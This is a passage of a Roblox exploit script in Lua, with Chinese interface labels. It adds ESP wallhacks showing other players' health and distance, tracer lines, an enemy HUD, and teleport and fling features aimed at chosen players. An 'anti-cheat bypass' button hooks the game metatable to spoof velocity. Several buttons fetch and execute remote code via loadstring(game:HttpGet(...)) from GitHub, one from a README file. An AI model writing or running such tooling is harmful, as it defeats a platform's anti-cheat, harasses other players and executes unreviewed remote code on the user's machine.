                            tracerPart.CFrame = CFrame.new(myPos, tarPos) * CFrame.new(0,0,-dist/2)
                            tracerPart.Parent = lineFolder
                        end
                    end
                end
            end)
        else
            if trackConn then
                trackConn:Disconnect()
                trackConn = nil
            end
            ClearParts()
        end
    end
})

Tabs.XrayTab:Section({Title = "esp血量透视"})

local espConn
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlr = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local Drawing = getgenv().Drawing or loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Drawing-Library/main/Drawing%20Library.lua"))()

local drawObjs = {}
getgenv().EspTextSize = 14 --放到getgenv全局环境

local function ClearAllDraw()
	for _,tbl in pairs(drawObjs) do
		for _,d in pairs(tbl) do
			d:Remove()
		end
	end
	table.clear(drawObjs)
end

Tabs.XrayTab:Input({
	Title = "ESP文字大小",
	Value = "14",
	Placeholder = "输入数字调整文字尺寸",
	Callback = function(input)
		getgenv().EspTextSize = tonumber(input) or 14
	end
})

Tabs.XrayTab:Toggle({
	Title = "玩家ESP(名字/血量/距离)",
	Icon = "check",
	Default = false,
	Callback = function(enabled)
		if enabled then
			espConn = RunService.RenderStepped:Connect(function()
				ClearAllDraw()
				local myChar = localPlr.Character
				if not myChar then return end
				local myRoot = myChar:FindFirstChild("HumanoidRootPart")
				if not myRoot then return end

				for _,plr in ipairs(Players:GetPlayers()) do
					if plr == localPlr then continue end
					local char = plr.Character
					if not char then continue end
					local hum = char:FindFirstChildOfClass("Humanoid")
					local head = char:FindFirstChild("Head")
					if not hum or not head then continue end

					local pos,onScreen = Camera:WorldToViewportPoint(head.Position)
					if not onScreen then continue end

					local dist = math.floor((myRoot.Position - head.Position).Magnitude)
					local hp = math.floor(hum.Health)
					local maxHp = math.floor(hum.MaxHealth)
					local textStr = string.format("%s | HP:%d/%d | Dist:%d",plr.Name,hp,maxHp,dist)

					local textDraw = Drawing.new("Text")
					textDraw.Text = textStr
					textDraw.Size = getgenv().EspTextSize
					textDraw.Color = Color3.new(1,1,1)
					textDraw.Position = Vector2.new(pos.X,pos.Y -25)
					textDraw.Center = true
					textDraw.Outline = true
					textDraw.Visible = true

					drawObjs[plr.UserId] = {textDraw}
				end
			end)
		else
			if espConn then
				espConn:Disconnect()
				espConn = nil
			end
			ClearAllDraw()
		end
	end
})

Tabs.XrayTab:Section({Title = "2d追踪线"})

local track2DConn
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local localPlr = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local drawList = {}

_G.TrackLineColor = Color3.new(1, 0, 1)
_G.TrackRainbow = false

local function ClearDraw()
    for _,obj in pairs(drawList) do
        obj:Remove()
    end
    table.clear(drawList)
end

Tabs.XrayTab:Toggle({
    Title = "2D紫色追踪线+玩家ESP(血量距离)",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            track2DConn = RunService.RenderStepped:Connect(function()
                ClearDraw()
                local myChar = localPlr.Character
                if not myChar then return end
                local myRoot = myChar:FindFirstChild("HumanoidRootPart")
                if not myRoot then return end

                local screenW = Camera.ViewportSize.X
                local screenH = Camera.ViewportSize.Y
                local lineStartPos = Vector2.new(screenW/2, screenH - 50)
                local hueTick = tick()%3

                for _,plr in ipairs(Players:GetPlayers()) do
                    if plr == localPlr then continue end
                    local char = plr.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local head = char and char:FindFirstChild("Head")
                    if not hum or not head or hum.Health <=0 then continue end

                    local worldPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    if not onScreen then continue end

                    local line = Drawing.new("Line")
                    line.From = lineStartPos
                    line.To = Vector2.new(worldPos.X, worldPos.Y)
                    if _G.TrackRainbow then
                        line.Color = Color3.fromHSV(hueTick,1,1)
                    else
                        line.Color = _G.TrackLineColor
                    end
                    line.Thickness =1.8
                    line.Visible = true
                    table.insert(drawList,line)

                    local dist = math.floor((myRoot.Position - head.Position).Magnitude)
                    local hpText = string.format("%s HP:%d/%d | %d格",plr.Name,math.floor(hum.Health),math.floor(hum.MaxHealth),dist)
                    local text = Drawing.new("Text")
                    text.Text = hpText
                    text.Position = Vector2.new(worldPos.X, worldPos.Y-22)
                    text.Size =13
                    text.Color = Color3.new(1,1,1)
                    text.Outline = true
                    text.Visible = true
                    table.insert(drawList,text)
                end
            end)
        else
            if track2DConn then
                track2DConn:Disconnect()
                track2DConn = nil
            end
            ClearDraw()
        end
    end
})

Tabs.XrayTab:Colorpicker({
    Title = "2D追踪线自定义颜色",
    Default = Color3.new(1, 0, 1),
    Callback = function(color)
        _G.TrackLineColor = color
    end
})

Tabs.XrayTab:Toggle({
    Title = "追踪线彩虹渐变",
    Icon = "rainbow",
    Default = false,
    Callback = function(enabled)
        _G.TrackRainbow = enabled
    end
})




local UserInputService = game:GetService("UserInputService")

Tabs.Settings:Section({Title = "外观设置"})

Tabs.Settings:Colorpicker({
    Title = "轮廓颜色",
    Default = Color3.fromHex("#FFFFFF"),
    Callback = function(color)
        WindUI.Themes.Dark.Outline = color
        WindUI:SetTheme("Dark")
        local mainFrame = Window.UIElements.Main
        if mainFrame then
            local stroke = mainFrame:FindFirstChild("FlowBorder")
            if stroke then
                local grad = stroke:FindFirstChild("StreamEffect")
                if grad then
                    grad.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0.00, color),
                        ColorSequenceKeypoint.new(0.50, Color3.new(1,1,1)),
                        ColorSequenceKeypoint.new(1.00, color),
                    })
                end
            end
        end
    end
})

Tabs.Settings:Colorpicker({
    Title = "填充颜色",
    Default = Color3.fromHex("#101010"),
    Callback = function(color)
        WindUI.Themes.Dark.Background = color
        WindUI:SetTheme("Dark")
    end
})

Tabs.Settings:Dropdown({
    Title = "主题切换",
    Values = {"Dark", "Light", "Rose", "Red", "Midnight", "CottonCandy", "Rainbow"},
    Value = "Midnight",
    Callback = function(value)
        WindUI:SetTheme(value)
    end
})

local function GetSafeUIScale()
    local cam = workspace.CurrentCamera
    if not cam then return 1 end
    local screen = cam.ViewportSize
    local main = Window.UIElements.Main
    if not main then return 1 end
    local baseSize = main.AbsoluteSize
    if baseSize.X == 0 or baseSize.Y == 0 then
        baseSize = Vector2.new(580, 460)
    end
    local maxX = (screen.X - 60) / baseSize.X
    local maxY = (screen.Y - 60) / baseSize.Y
    return math.clamp(math.min(maxX, maxY, 1.4), 0.5, 1.4)
end

local function SetUIScaleSmooth(targetScale)
    if not WindUI.UIScaleObj then return end
    local safe = math.clamp(targetScale, 0.5, GetSafeUIScale())
    local ok = pcall(function()
        game:GetService("TweenService"):Create(
            WindUI.UIScaleObj,
            TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
            {Scale = safe}
        ):Play()
    end)
    if not ok then
        WindUI.UIScaleObj.Scale = safe
    end
end

Tabs.Settings:Slider({
    Title = "UI 缩放",
    Step = 0.05,
    Value = {Min = 0.5, Max = 1.4, Default = WindUI.UIScaleObj and WindUI.UIScaleObj.Scale or 1},
    Callback = function(value)
        local safeMax = GetSafeUIScale()
        if value > safeMax then
            value = safeMax
            WindUI:Notify({
                Title = "缩放保护",
                Content = "已限制为屏幕安全值: " .. string.format("%.2f", safeMax),
                Duration = 2
            })
        end
        SetUIScaleSmooth(value)
    end
})

Tabs.Settings:Button({
    Title = "自适应屏幕缩放",
    Callback = function()
        local safe = GetSafeUIScale()
        SetUIScaleSmooth(safe)
        WindUI:Notify({
            Title = "自适应完成",
            Content = "已设置为最佳缩放: " .. string.format("%.2f", safe),
            Duration = 3
        })
    end
})

Tabs.Settings:Button({
    Title = "恢复默认缩放",
    Callback = function()
        SetUIScaleSmooth(1)
        WindUI:Notify({Title = "已恢复", Content = "UI 缩放已重置为 1.0", Duration = 2})
    end
})

Tabs.Settings:Slider({
    Title = "背景图透明度",
    Step = 0.05,
    Value = {Min = 0, Max = 1, Default = 0.2},
    Callback = function(value)
        Window:SetBackgroundImageTransparency(value)
    end
})

Tabs.Settings:Section({Title = "自定义窗口背景图"})
local customBgAssetId = "rbxassetid://135461405245048"
Tabs.Settings:Input({
    Title = "背景图资源ID",
    Value = customBgAssetId,
    Placeholder = "rbxassetid://xxxxxxx 或数字ID",
    Callback = function(inputText)
        local txt = inputText:gsub("%s","")
        if tonumber(txt) then
            customBgAssetId = "rbxassetid://"..txt
        else
            customBgAssetId = txt
        end
    end
})

Tabs.Settings:Button({
    Title = "应用自定义背景图",
    Callback = function()
        Window:SetBackgroundImage(customBgAssetId)
        WindUI:Notify({
            Title = "背景设置",
            Content = "已应用背景："..customBgAssetId,
            Duration = 2.5
        })
    end
})

Tabs.Settings:Button({
    Title = "恢复脚本默认背景",
    Callback = function()
        customBgAssetId = "rbxassetid://109195003073445"
        Window:SetBackgroundImage(customBgAssetId)
        WindUI:Notify({
            Title = "背景设置",
            Content = "已恢复脚本默认背景图",
            Duration = 2.5
        })
    end
})

Tabs.Settings:Section({Title = "动画效果"})

Tabs.Settings:Slider({
    Title = "流光边框速度",
    Step = 0.5,
    Value = {Min = 0, Max = 20, Default = FLOW_SPEED},
    Callback = function(value)
        FLOW_SPEED = value
    end
})

Tabs.Settings:Toggle({
    Title = "启用流光边框",
    Icon = "check",
    Default = true,
    Callback = function(enabled)
        if enabled then
            if not borderAnimation then
                startBorderAnimation(Window)
            end
        else
            if borderAnimation then
                borderAnimation:Disconnect()
                borderAnimation = nil
            end
        end
    end
})

Tabs.Settings:Section({Title = "点击音效"})

local clickSoundConfig = {
    Enabled = false,
    SoundId = "rbxassetid://9113083740",
    Delay = 0,
    Duration = 0.3,
    Volume = 0.5
}
local clickSoundConn = nil

local function playClickEffect()
    if not clickSoundConfig.Enabled then return end
    task.delay(clickSoundConfig.Delay, function()
        local sound = Instance.new("Sound")
        sound.SoundId = clickSoundConfig.SoundId
        sound.Volume = clickSoundConfig.Volume
        sound.Parent = WindUI.ScreenGui
        sound:Play()
        task.delay(clickSoundConfig.Duration, function()
            if sound then sound:Destroy() end
        end)
    end)
end

local function updateClickListener()
    if clickSoundConn then
        clickSoundConn:Disconnect()
        clickSoundConn = nil
    end
    if clickSoundConfig.Enabled then
        clickSoundConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
            if not clickSoundConfig.Enabled then return end
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if gameProcessed then
                    playClickEffect()
                end
            end
        end)
    end
end

Tabs.Settings:Toggle({
    Title = "启用点击音效",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        clickSoundConfig.Enabled = enabled
        updateClickListener()
    end
})

Tabs.Settings:Input({
    Title = "音频ID",
    Value = "rbxassetid://9113083740",
    Placeholder = "输入 rbxassetid://...",
    Callback = function(text)
        text = text:gsub("^%s*(.-)%s*$", "%1")
        if text:sub(1, 13) ~= "rbxassetid://" then
            text = "rbxassetid://" .. text:gsub("%D", "")
        end
        clickSoundConfig.SoundId = text
    end
})

Tabs.Settings:Slider({
    Title = "延迟开始(秒)",
    Step = 0.1,
    Value = {Min = 0, Max = 3, Default = 0},
    Callback = function(val)
        clickSoundConfig.Delay = val
    end
})

Tabs.Settings:Slider({
    Title = "播放时长(秒)",
    Step = 0.1,
    Value = {Min = 0.1, Max = 5, Default = 0.3},
    Callback = function(val)
        clickSoundConfig.Duration = val
    end
})

Tabs.Settings:Slider({
    Title = "音量大小(0-10)",
    Step = 0.5,
    Value = {Min = 0, Max = 10, Default = 5},
    Callback = function(val)
        clickSoundConfig.Volume = val / 10
    end
})

Tabs.Settings:Button({
    Title = "试听音效",
    Callback = function()
        playClickEffect()
        WindUI:Notify({Title = "点击音效", Content = "正在试听...", Duration = 1})
    end
})

-- ==================== 屏幕工具 ====================
Tabs.Settings:Section({Title = "屏幕工具"})

local function CreateWindDisplay(name, posY)
    local gui = Instance.new("ScreenGui")
    gui.Name = name
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = WindUI.ScreenGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 132, 0, 36)
    bg.Position = UDim2.new(0, 20, 0, posY)
    bg.BackgroundColor3 = Color3.fromHex("#151515")
    bg.BackgroundTransparency = 0.15
    bg.BorderSizePixel = 0
    bg.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = bg

    local stroke = Instance.new("UIStroke")
    stroke.Thickness = 1.2
    stroke.Color = Color3.fromHex("#FFFFFF")
    stroke.Transparency = 0.82
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = bg

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -14, 1, 0)
    label.Position = UDim2.new(0, 7, 0, 0)
    label.BackgroundTransparency = 1
    label.FontFace = Font.new(WindUI.Creator.Font, Enum.FontWeight.SemiBold)
    label.TextSize = 15
    label.TextColor3 = Color3.fromHex("#FFFFFF")
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = bg

    return gui, label
end

local fpsGui, fpsLabel, fpsConn = nil, nil, nil
Tabs.Settings:Toggle({
    Title = "屏幕 FPS 显示",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            if fpsGui then fpsGui:Destroy() end
            fpsGui, fpsLabel = CreateWindDisplay("LuFPSDisplay", 20)
            local frameCount = 0
            local lastClock = os.clock()
            fpsConn = game:GetService("RunService").RenderStepped:Connect(function()
                frameCount += 1
                local now = os.clock()
                if now - lastClock >= 1 then
                    fpsLabel.Text = "  FPS: " .. frameCount
                    frameCount = 0
                    lastClock = now
                end
            end)
        else
            if fpsGui then fpsGui:Destroy() fpsGui = nil end
            if fpsConn then fpsConn:Disconnect() fpsConn = nil end
        end
    end
})

local timeGui, timeLabel, timeConn = nil, nil, nil
Tabs.Settings:Toggle({
    Title = "屏幕时间显示",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        if enabled then
            if timeGui then timeGui:Destroy() end
            timeGui, timeLabel = CreateWindDisplay("LuTimeDisplay", 62)
            timeLabel.Text = "  " .. os.date("%H:%M:%S")
            timeConn = game:GetService("RunService").Heartbeat:Connect(function()
                timeLabel.Text = "  " .. os.date("%H:%M:%S")
            end)
        else
            if timeGui then timeGui:Destroy() timeGui = nil end
            if timeConn then timeConn:Disconnect() timeConn = nil end
        end
    end
})

Tabs.Settings:Section({Title = "系统操作"})

Tabs.Settings:Button({
    Title = "测试通知",
    Callback = function()
        WindUI:Notify({
            Title = "鹿脚本",
            Content = "通知系统运行正常！当前时间：" .. os.date("%H:%M:%S"),
            Icon = "check",
            Duration = 4
        })
    end
})

Tabs.Settings:Button({
    Title = "重置窗口位置",
    Callback = function()
        Window:SetToTheCenter()
        WindUI:Notify({
            Title = "系统",
            Content = "窗口已重置到屏幕中央",
            Duration = 3
        })
    end
})

Tabs.Settings:Button({
    Title = "复制服务器ID",
    Callback = function()
        local sid = game.JobId
        if setclipboard then
            setclipboard(sid)
            WindUI:Notify({Title = "系统", Content = "服务器ID已复制到剪贴板", Duration = 3})
        else
            WindUI:Notify({Title = "错误", Content = "当前注入器不支持复制功能", Duration = 3})
        end
    end
})

Tabs.Settings:Button({
    Title = "紧急停止所有功能",
    Callback = function()
        local stopped = 0
        local function tryDisconnect(name)
            if _G[name] and typeof(_G[name]) == "RBXScriptConnection" then
                _G[name]:Disconnect()
                _G[name] = nil
                stopped = stopped + 1
            end
        end
        tryDisconnect("LuHealthLoop")
        tryDisconnect("LuHoverConn")
        tryDisconnect("LuCamLoop")
        tryDisconnect("LuFullBright")
        tryDisconnect("LuRotateConn")
        tryDisconnect("LuClickTpConn")
        
        WindUI:Notify({
            Title = "紧急停止",
            Content = "已清理 " .. stopped .. " 个活动连接",
            Duration = 4
        })
    end
})

Tabs.Settings:Button({
    Title = "关闭/销毁脚本",
    Callback = function()
        Window:Dialog({
            Title = "确认关闭",
            Content = "确定要关闭鹿脚本吗？关闭后需要重新注入。",
            Buttons = {
                {Title = "取消", Variant = "Secondary", Callback = function() end},
                {Title = "确认关闭", Variant = "Primary", Callback = function()
                    Window:Destroy()
                end}
            }
        })
    end
})

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local selectedTarget = nil
local teleportLoop = nil
local originalCFrame = nil 

Tabs.TeleportFlyTab:Dropdown({
    Title = "选择目标玩家",
    Values = (function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        return list
    end)(),
    Value = "",
    Callback = function(selectStr)
        local userName = string.split(selectStr, " | ")[1]
        local targetPlr = Players:FindFirstChild(userName)
        if not targetPlr then
            Window:Notification({Title="错误",Message="未找到该玩家",Duration=2})
            selectedTarget = nil
            return
        end
        selectedTarget = targetPlr
        Window:Notification({Title="选中成功",Message="已锁定："..targetPlr.DisplayName,Duration=1.2})
    end
})

Tabs.TeleportFlyTab:Button({
    Title = "刷新玩家列表",
    Callback = function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        Tabs.TeleportFlyTab.Dropdowns["选择目标玩家"]:SetValues(list)
        Window:Notification({Title="刷新成功",Message="玩家列表已更新",Duration=1})
    end
})

Tabs.TeleportFlyTab:Button({
    Title = "传送至选中玩家头顶",
    Callback = function()
        if not selectedTarget then
            Window:Notification({Title="提示",Message="请先在下拉选择玩家",Duration=2})
            return
        end
        local myChar = lp.Character
        local targetChar = selectedTarget.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        if myRoot and targetRoot then
            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
            Window:Notification({Title="传送成功",Message="到达目标头顶",Duration=1.5})
        else
            Window:Notification({Title="传送失败",Message="角色未加载完成",Duration=2})
        end
    end
})

Tabs.TeleportFlyTab:Toggle({
    Title = "持续锁定传送(头顶)",
    Default = false,
    Callback = function(state)
        if state then
            if not selectedTarget then
                Window:Notification({Title="提示",Message="先选择目标玩家！",Duration=2})
                return false
            end
            local myChar = lp.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then
                Window:Notification({Title="提示",Message="角色未加载，无法开启",Duration=2})
                return false
            end
            originalCFrame = myRoot.CFrame -- 保存开启瞬间的位置
            teleportLoop = task.spawn(function()
                while task.wait(0.1) do
                    if not selectedTarget then break end
                    local char = lp.Character
                    local targetChar = selectedTarget.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
                    if root and targetRoot then
                        root.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
                    end
                end
            end)
            Window:Notification({Title="开启",Message="持续传送已启动",Duration=1})
        else
            if teleportLoop then
                task.cancel(teleportLoop)
                teleportLoop = nil                
                local myChar = lp.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if myRoot and originalCFrame then
                    myRoot.CFrame = originalCFrame
                end
                originalCFrame = nil
                Window:Notification({Title="关闭",Message="持续传送停止，已返回原位",Duration=1})
            end
        end
    end
})

Tabs.TeleportFlyTab:Divider()
local spinTarget = nil
local SpinSpeed = 18
local spinLoop = nil
local spinOriginalCFrame = nil

Tabs.TeleportFlyTab:Dropdown({
    Title = "旋转甩飞-选择玩家",
    Values = (function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        return list
    end)(),
    Value = "",
    Callback = function(selectStr)
        local userName = string.split(selectStr, " | ")[1]
        local targetPlr = Players:FindFirstChild(userName)
        if not targetPlr then
            Window:Notification({Title="错误",Message="未找到该玩家",Duration=2})
            spinTarget = nil
            return
        end
        spinTarget = targetPlr
        Window:Notification({Title="选中成功",Message="甩飞锁定："..targetPlr.DisplayName,Duration=1.2})
    end
})

Tabs.TeleportFlyTab:Button({
    Title = "刷新甩飞玩家列表",
    Callback = function()
        local list = {}
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= lp then
                table.insert(list, plr.Name.." | "..plr.DisplayName)
            end
        end
        Tabs.TeleportFlyTab.Dropdowns["旋转甩飞-选择玩家"]:SetValues(list)
        Window:Notification({Title="刷新成功",Message="甩飞玩家列表已更新",Duration=1})
    end
})

Tabs.TeleportFlyTab:Input({
    Title = "旋转速度",
    Value = "18",
    Placeholder = "数值越大转越快",
    Callback = function(input)
        SpinSpeed = tonumber(input) or 18
    end
})
Tabs.TeleportFlyTab:Button({
    Title = "执行旋转甩飞",
    Callback = function()
        if not spinTarget then
            Window:Notification({Title="提示",Message="请先选择甩飞目标玩家",Duration=2})
            return
        end
        local localPlr = lp
        if not localPlr.Character then return end
        local localRoot = localPlr.Character:FindFirstChild("HumanoidRootPart")
        local targetChar = spinTarget.Character
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        if not targetRoot or not localRoot then
            Window:Notification({Title="提示",Message="角色未加载完成",Duration=2})
            return
        end

        local originalMyPos = localRoot.CFrame

        task.spawn(function()
            for i = 1,120 do
                if not localRoot or not targetRoot then break end
                localRoot.CFrame = targetRoot.CFrame * CFrame.Angles(0,math.rad(i*SpinSpeed),0)
                task.wait(0)
            end
            if localRoot then
                localRoot.CFrame = originalMyPos
            end
        end)
    end
})

-- 新增开关：持续环绕旋转，关闭回到原位
Tabs.TeleportFlyTab:Toggle({
    Title = "持续环绕旋转甩飞",
    Default = false,
    Callback = function(state)
        if state then
            if not spinTarget then
                Window:Notification({Title="提示",Message="先选择目标玩家！",Duration=2})
                return false
            end
            local myChar = lp.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            local targetChar = spinTarget.Character
            local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
            if not myRoot or not targetRoot then
                Window:Notification({Title="提示",Message="角色未加载，无法开启",Duration=2})
                return false
            end
            spinOriginalCFrame = myRoot.CFrame
            local angle = 0
            spinLoop = task.spawn(function()
                while task.wait(0) do
                    if not spinTarget then break end
                    local c = lp.Character
                    local tChar = spinTarget.Character
                    local root = c and c:FindFirstChild("HumanoidRootPart")
                    local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
                    if root and tRoot then
                        angle += math.rad(SpinSpeed)
                        root.CFrame = tRoot.CFrame * CFrame.Angles(0, angle, 0)
                    end
                end
            end)
            Window:Notification({Title="开启",Message="持续环绕旋转已启动",Duration=1})
        else
            if spinLoop then
                task.cancel(spinLoop)
                spinLoop = nil
                local myChar = lp.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                if myRoot and spinOriginalCFrame then
                    myRoot.CFrame = spinOriginalCFrame
                end
                spinOriginalCFrame = nil
                Window:Notification({Title="关闭",Message="旋转停止，返回原位",Duration=1})
            end
        end
    end
})
Tabs.XrayTab:Section({Title = "hud"})

Tabs.XrayTab:Toggle({
	Title = "右侧敌人HUD",
	Default = false,
	Callback = function(state)
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local Camera = workspace.CurrentCamera
		local TweenService = game:GetService("TweenService")

		if not getgenv().EnemyHUD then
			getgenv().EnemyHUD = {
				Connection = nil,
				GUI = nil
			}
		end

		if state then
			local ScreenGui = Instance.new("ScreenGui")
			ScreenGui.Name = "RightSideEnemyHUD"
			ScreenGui.ResetOnSpawn = false
			ScreenGui.Parent = game:GetService("CoreGui")

			local mainFrame = Instance.new("Frame")
			mainFrame.AnchorPoint = Vector2.new(1, 0)
			mainFrame.Position = UDim2.new(1, 20, 0.35, 0)
			mainFrame.Size = UDim2.new(0, 360, 0, 110)
			mainFrame.BackgroundColor3 = Color3.new(0.08, 0.08, 0.08)
			mainFrame.BackgroundTransparency = 0.25
			mainFrame.ClipsDescendants = true
			mainFrame.Visible = false
			mainFrame.Parent = ScreenGui

			local corner = Instance.new("UICorner")
			corner.CornerRadius = UDim.new(0, 18)
			corner.Parent = mainFrame

			local avatarImg = Instance.new("ImageLabel")
			avatarImg.Size = UDim2.new(0, 84, 0, 84)
			avatarImg.Position = UDim2.new(0, 12, 0, 13)
			avatarImg.BackgroundTransparency = 1
			avatarImg.ClipsDescendants = true
			avatarImg.Parent = mainFrame

			local avatarCorner = Instance.new("UICorner")
			avatarCorner.CornerRadius = UDim.new(0, 16)
			avatarCorner.Parent = avatarImg

			local nameText = Instance.new("TextLabel")
			nameText.Size = UDim2.new(0, 240, 0, 32)
			nameText.Position = UDim2.new(0, 108, 0, 10)
			nameText.BackgroundTransparency = 1
			nameText.TextColor3 = Color3.new(1, 1, 1)
			nameText.Font = Enum.Font.GothamBold
			nameText.TextSize = 24
			nameText.Text = ""
			nameText.TextXAlignment = Enum.TextXAlignment.Left
			nameText.Parent = mainFrame

			local hpBg = Instance.new("Frame")
			hpBg.Size = UDim2.new(0, 220, 0, 24)
			hpBg.Position = UDim2.new(0, 108, 0, 46)
			hpBg.BackgroundColor3 = Color3.new(0.22, 0.22, 0.22)
			hpBg.ClipsDescendants = true
			hpBg.Parent = mainFrame

			local hpBgCorner = Instance.new("UICorner")
			hpBgCorner.CornerRadius = UDim.new(0, 12)
			hpBgCorner.Parent = hpBg

			local hpFill = Instance.new("Frame")
			hpFill.Size = UDim2.new(1, 0, 1, 0)
			hpFill.BackgroundColor3 = Color3.new(0.15, 0.85, 0.22)
			hpFill.ClipsDescendants = true
			hpFill.Parent = hpBg

			local hpFillCorner = Instance.new("UICorner")
			hpFillCorner.CornerRadius = UDim.new(0, 12)
			hpFillCorner.Parent = hpFill

			local hpNumText = Instance.new("TextLabel")
			hpNumText.Size = UDim2.new(0, 200, 0, 22)
			hpNumText.Position = UDim2.new(0, 110, 0, 48)
			hpNumText.BackgroundTransparency = 1
			hpNumText.TextColor3 = Color3.new(1, 1, 1)
			hpNumText.Font = Enum.Font.Gotham
			hpNumText.TextSize = 17
			hpNumText.TextXAlignment = Enum.TextXAlignment.Left
			hpNumText.Text = "100 / 100"
			hpNumText.Parent = mainFrame

			local distText = Instance.new("TextLabel")
			distText.Size = UDim2.new(0, 120, 0, 26)
			distText.Position = UDim2.new(0, 225, 0, 76)
			distText.BackgroundTransparency = 1
			distText.TextColor3 = Color3.new(1, 1, 0.55)
			distText.Font = Enum.Font.Gotham
			distText.TextSize = 19
			distText.TextXAlignment = Enum.TextXAlignment.Right
			distText.Text = "00.0 m"
			distText.Parent = mainFrame

			local isAnimating = false
			local targetVisible = false
			local lastUserId = nil

			local function showHUD()
				if isAnimating or targetVisible then return end
				targetVisible = true
				isAnimating = true
				mainFrame.Visible = true
				mainFrame.Position = UDim2.new(1, 20, 0.35, 0)
				local tween = TweenService:Create(
					mainFrame,
					TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
					{Position = UDim2.new(1, -20, 0.35, 0)}
				)
				tween:Play()
				tween.Completed:Connect(function()
					isAnimating = false
				end)
			end

			local function hideHUD()
				if isAnimating or not targetVisible then return end
				targetVisible = false
				isAnimating = true
				local tween = TweenService:Create(
					mainFrame,
					TweenInfo.new(0.22, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
					{Position = UDim2.new(1, 20, 0.35, 0)}
				)
				tween:Play()
				tween.Completed:Connect(function()
					mainFrame.Visible = false
					isAnimating = false
				end)
			end

			getgenv().EnemyHUD.Connection = RunService.RenderStepped:Connect(function()
				local closestEnemy = nil
				local minDist = math.huge

				for _, plr in ipairs(Players:GetPlayers()) do
					if plr == Players.LocalPlayer then continue end
					local char = plr.Character
					if not char then continue end
					local hrp = char:FindFirstChild("HumanoidRootPart")
					local hum = char:FindFirstChild("Humanoid")
					if not hrp or not hum or hum.Health <= 0 then continue end

					local _, onScreen = Camera:WorldToViewportPoint(hrp.Position)
					if not onScreen then continue end

					local dist = (Camera.CFrame.Position - hrp.Position).Magnitude
					if dist < minDist then
						minDist = dist
						closestEnemy = {player = plr, hum = hum, distance = dist}
					end
				end

				if closestEnemy then
					local data = closestEnemy
					nameText.Text = data.player.Name
					local hpRatio = math.clamp(data.hum.Health / data.hum.MaxHealth, 0, 1)
					hpFill.Size = UDim2.new(hpRatio, 0, 1, 0)
					hpNumText.Text = math.floor(data.hum.Health) .. " / " .. data.hum.MaxHealth
					distText.Text = string.format("%.1f m", data.distance)

					if lastUserId ~= data.player.UserId then
						lastUserId = data.player.UserId
						avatarImg.Image = Players:GetUserThumbnailAsync(data.player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end
					showHUD()
				else
					hideHUD()
					lastUserId = nil
				end
			end)
			getgenv().EnemyHUD.GUI = ScreenGui
		else
			if getgenv().EnemyHUD.Connection then
				getgenv().EnemyHUD.Connection:Disconnect()
			end
			if getgenv().EnemyHUD.GUI then
				pcall(function()
					getgenv().EnemyHUD.GUI:Destroy()
				end)
			end
			getgenv().EnemyHUD = nil
		end
	end
})


Tabs.Fun:Button({
	Title = "反作弊绕过",
	Callback = function()
local mt, old = getrawmetatable(game), getrawmetatable(game).__index; setreadonly(mt, false)
mt.__index = newcclosure(function(self, key) return key == "AssemblyLinearVelocity" and self.Name == "HumanoidRootPart" and Vector3.new() or old(self, key) end)
	end 
})

Tabs.NewTab:Button({
	Title = "物品控制",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/axionscripts1/Move-Blocks-v20/refs/heads/main/README.md"))()
	end 
})

local player = game.Players.LocalPlayer
local humanoidRootPart
local running = false
local scanThread
local scanDelay = 0.1

local function RefreshChar()
    local character = player.Character or player.CharacterAdded:Wait()
